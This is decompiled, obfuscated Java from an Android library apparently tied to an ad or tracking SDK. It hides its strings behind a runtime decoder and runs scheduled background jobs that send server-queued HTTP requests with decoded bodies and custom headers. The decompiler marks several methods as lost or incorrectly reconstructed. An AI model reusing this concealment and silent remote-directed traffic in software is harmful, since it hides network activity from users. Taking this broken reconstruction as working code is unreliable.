package com.aiming.mdt.a;

import android.text.TextUtils;
import android.util.Base64;
import java.net.URI;
import java.util.HashMap;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;

/* JADX WARN: $VALUES field not found */
/* JADX WARN: Failed to restore enum class, 'enum' modifier and super class removed */
/* renamed from: com.aiming.mdt.a.ʽʾʿ, reason: contains not printable characters */
/* loaded from: classes.dex */
public final class EnumC0150 {

    /* renamed from: ʻʽ, reason: contains not printable characters */
    private static long f499 = -5126448089664142464L;

    /* renamed from: ʼʽ, reason: contains not printable characters */
    private static int f501 = 1;

    /* renamed from: ʾ, reason: contains not printable characters */
    private static int f502;

    /* renamed from: ʻʼ, reason: contains not printable characters */
    private ConcurrentLinkedQueue<C0087> f503;

    /* renamed from: ʽ, reason: contains not printable characters */
    private C0087 f504;

    /* renamed from: ʼ, reason: contains not printable characters */
    private static char[] f500 = {'N', 50149, 34680, 19188, 3668, 53737, 38253, 22757, 7226, 'A', 50164, 34644, 19169, 3699, 53739, 38225, 22773, 7269, 57333, 41829, 26323, 10857, 60922, 45413, 29882, 26143, 42435, 57684, 11423, 26713, 47069, 62272, 16066, 31247, 56614, 7930, 23149, 38822, 54126, 3302, 18486, 44777, 28028, 10632, 58477, 41168, 32589, 15307, 63069, 45788, 29005, 3474, 'U', 50163, 34661, 19186, 3629, 53697, 38247, 22757, 7278, 57332, 'U', 50132, 34630, 19117, 3640, 'h', 50164, 34676, 19184, 34261, 17993, 713, 53069, 35790, 'R', 50149, 34675, 19184, 3695, 53742, 38259, 22757, 7253, 57330, 41836, 26298, 37734, 20689, 5191, 55748, 40283, 17114, 1607, 52177, 36727, 19675, 12368, 62929, 47374, 'R', 50149, 34675, 19184, 3695, 53742, 38259, 22757, 7235, 57327, 41838, 26356, 10853, 60910, 45428, 29882, 13019, 61761, 46560, 30807, 15553, 58178, 42973, 27228, 11969, 60759, 37256, 'A', 50132, 34592, 19141, 3704, 53733, 38243, 22773, 7284, 57317, 41760, 26323, 10869, 60899, 45413, 29939, 14451, 64442, 'A', 50164, 34647, 19183, 3698, 53739, 38245, 22770, 7200, 57317, 41848, 26341, 10851, 60917, 45428, 29925, 14368, 64485, 49010, 33522, 18031, 2546, 52538, 'S', 50121, 34638, 19143, 3660, 53701, 38228, 22735, 7246};

    /* renamed from: ʻ, reason: contains not printable characters */
    public static final EnumC0150 f498 = new EnumC0150(m584(0, 9, 169).intern());

    static {
        new EnumC0150[1][0] = f498;
        int i = f501 + 65;
        f502 = i % 128;
        if (i % 2 != 0) {
        }
    }

    private EnumC0150(String str) {
    }

    /* renamed from: ʻʼ, reason: contains not printable characters */
    static /* synthetic */ void m583(EnumC0150 enumC0150) {
        int i = f501 + 37;
        f502 = i % 128;
        if (i % 2 != 0) {
            enumC0150.m586();
        } else {
            enumC0150.m586();
        }
    }

    /* renamed from: ʻʽ, reason: contains not printable characters */
    private static String m584(char c2, int i, int i2) {
        int i3 = f502 + 13;
        f501 = i3 % 128;
        if (i3 % 2 == 0) {
        }
        char[] cArr = new char[i];
        int i4 = f502 + 79;
        f501 = i4 % 128;
        int i5 = i4 % 2;
        int i6 = 0;
        while (i6 < i) {
            int i7 = f502 + 123;
            f501 = i7 % 128;
            if (!(i7 % 2 != 0)) {
                cArr[i6] = (char) ((f500[i2 >>> i6] / (i6 - f499)) ^ c2);
                i6 += 21;
            } else {
                cArr[i6] = (char) ((f500[i2 + i6] ^ (i6 * f499)) ^ c2);
                i6++;
            }
        }
        return new String(cArr);
    }

    /* JADX WARN: Code restructure failed: missing block: B:12:0x0048, code lost:
    
        if ((r4.f504 == null) != true) goto L20;
     */
    /* JADX WARN: Code restructure failed: missing block: B:13:0x006c, code lost:
    
        r0 = com.aiming.mdt.a.EnumC0150.f501 + 39;
        com.aiming.mdt.a.EnumC0150.f502 = r0 % 128;
        r0 = r0 % 2;
        r4.m586();
     */
    /* JADX WARN: Code restructure failed: missing block: B:15:0x006a, code lost:
    
        if (r4.f504 != null) goto L20;
     */
    /* renamed from: ʻʽ, reason: contains not printable characters */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    static /* synthetic */ void m585(EnumC0150 enumC0150) {
        if (enumC0150.f503 != null) {
            if (C0079.m244(C0195.m731().m738())) {
                int i = f501 + 85;
                f502 = i % 128;
                if (i % 2 != 0) {
                    m584((char) 0, 4, 75).intern();
                    enumC0150.f503.size();
                    C0044.m108();
                    enumC0150.f504 = enumC0150.f503.poll();
                } else {
                    m584((char) 0, 16, 9).intern();
                    enumC0150.f503.size();
                    C0044.m108();
                    enumC0150.f504 = enumC0150.f503.poll();
                }
            }
        }
        int i2 = f502 + 81;
        f501 = i2 % 128;
        if (i2 % 2 == 0) {
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:44:0x016a, code lost:
    
        if (r0.m276() != false) goto L47;
     */
    /* JADX WARN: Removed duplicated region for block: B:65:0x0248  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x024f  */
    /* JADX WARN: Removed duplicated region for block: B:70:0x024b  */
    /* renamed from: ʼ, reason: contains not printable characters */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    private void m586() {
        String m694;
        String intern;
        String m584;
        C0090 m362;
        if (this.f504.m289() != 0) {
            C0184 c0184 = new C0184();
            c0184.m703(String.valueOf(this.f504.m281()));
            c0184.m693(this.f504.m293());
            c0184.m700(this.f504.m287());
            c0184.m709(this.f504.m269());
            c0184.m708(this.f504.m284());
            c0184.m702(this.f504.m275());
            if (this.f504.m289() != 1) {
                if (this.f504.m289() == 2) {
                    c0184.m699(1);
                    m694 = c0184.m694();
                    intern = m584((char) 56585, 7, 34).intern();
                    m584 = m584((char) 26160, 9, 25);
                }
                if ((this.f504.m289() != 3 ? '\t' : (char) 19) != 19) {
                    c0184.m699(2);
                    c0184.m708(c0184.m694().replace(m584((char) 56585, 7, 34).intern(), m584((char) 26160, 9, 25).intern()));
                    this.f504.m278(1);
                }
                c0184.m695(this.f504.m265());
                c0184.m697(this.f504.m277());
                new C0157(c0184, new C0043(this)).m598();
                return;
            }
            int i = f501 + 53;
            f502 = i % 128;
            int i2 = i % 2;
            c0184.m699(0);
            m694 = c0184.m694();
            intern = m584((char) 26160, 9, 25).intern();
            m584 = m584((char) 56585, 7, 34);
            c0184.m708(m694.replace(intern, m584.intern()));
            this.f504.m278(0);
            if ((this.f504.m289() != 3 ? '\t' : (char) 19) != 19) {
            }
            c0184.m695(this.f504.m265());
            c0184.m697(this.f504.m277());
            new C0157(c0184, new C0043(this)).m598();
            return;
        }
        C0087 c0087 = this.f504;
        try {
            m584((char) 44712, 11, 41).intern();
            C0044.m108();
            URI create = URI.create(c0087.m284());
            HashMap<String, String> m282 = c0087.m282();
            if (!TextUtils.isEmpty(c0087.m269())) {
                int i3 = f501 + 99;
                f502 = i3 % 128;
                int i4 = i3 % 2;
                m282.put(m584((char) 0, 10, 52).intern(), c0087.m269());
            }
            byte[] bytes = c0087.m273().getBytes(m584((char) 0, 5, 62).intern());
            if ((c0087.m286() ? '3' : '0') == '3') {
                bytes = Base64.decode(bytes, 0);
                int i5 = f501 + 81;
                f502 = i5 % 128;
                int i6 = i5 % 2;
            }
            C0145 m564 = new C0145().m558(create).m562(m282).m565(bytes).m564(c0087.m288());
            AbstractC0093 c0182 = create.getScheme().equals(m584((char) 0, 4, 67).intern()) ? new C0182() : null;
            if (create.getScheme().equals(m584((char) 34237, 5, 71).intern())) {
                c0182 = new C0025();
            }
            m362 = !(c0182 == null) ? c0182.m362(m564, c0087.m294()) : null;
            m584((char) 0, 12, 76).intern();
            m362.m333();
            C0044.m108();
            m584((char) 37684, 13, 88).intern();
            m362.m336();
            C0044.m108();
            m584((char) 0, 16, 101).intern();
            m362.m332();
            m584((char) 0, 5, 62).intern();
            C0044.m108();
        } catch (Exception e) {
            m584((char) 0, 23, 146).intern();
            C0044.m109();
            C0076.m232().m236(e);
            return;
        }
        if ((m362 != null ? (char) 22 : 'a') != 'a') {
            int i7 = f501 + 57;
            f502 = i7 % 128;
            if (i7 % 2 != 0) {
                m584((char) 12978, 116, 88).intern();
                c0087.m276();
                C0044.m108();
                if (!c0087.m276()) {
                }
                C0031.m39(m362, c0087);
                int i8 = f501 + 99;
                f502 = i8 % 128;
                if (i8 % 2 != 0) {
                }
            } else {
                m584((char) 12978, 11, 117).intern();
                c0087.m276();
                C0044.m108();
            }
            m584((char) 0, 23, 146).intern();
            C0044.m109();
            C0076.m232().m236(e);
            return;
        }
        m584((char) 0, 18, 128).intern();
        C0044.m108();
    }

    /* renamed from: ʼ, reason: contains not printable characters */
    static /* synthetic */ void m587(EnumC0150 enumC0150) {
        while (true) {
            C0051 m37 = C0031.m37();
            if (m37 == null) {
                return;
            }
            int i = f502 + 63;
            f501 = i % 128;
            if (i % 2 == 0) {
                enumC0150.f503 = m37.m158();
                int m160 = m37.m160();
                Object obj = null;
                super.hashCode();
                if (m160 == 0) {
                    return;
                }
            } else {
                enumC0150.f503 = m37.m158();
                if (m37.m160() == 0) {
                    return;
                }
            }
            m584((char) 0, 9, 0).intern();
            m37.m160();
            C0044.m108();
            Thread.sleep(m37.m160());
            int i2 = f502 + 77;
            f501 = i2 % 128;
            if (i2 % 2 == 0) {
            }
        }
    }

    /* renamed from: ʽ, reason: contains not printable characters */
    static /* synthetic */ C0087 m588(EnumC0150 enumC0150) {
        int i = f502 + 95;
        f501 = i % 128;
        int i2 = i % 2;
        C0087 c0087 = enumC0150.f504;
        int i3 = f502 + 11;
        f501 = i3 % 128;
        if (i3 % 2 == 0) {
        }
        return c0087;
    }

    /* renamed from: ʻ, reason: contains not printable characters */
    public final void m589() {
        C0057.m177().m178(new RunnableC0129(this), 10L, C0195.m731().m735().m485() * 60, TimeUnit.SECONDS);
        C0057.m177().m178(new RunnableC0108(this), 30L, 5L, TimeUnit.SECONDS);
        int i = f501 + 79;
        f502 = i % 128;
        if (i % 2 != 0) {
        }
    }
}
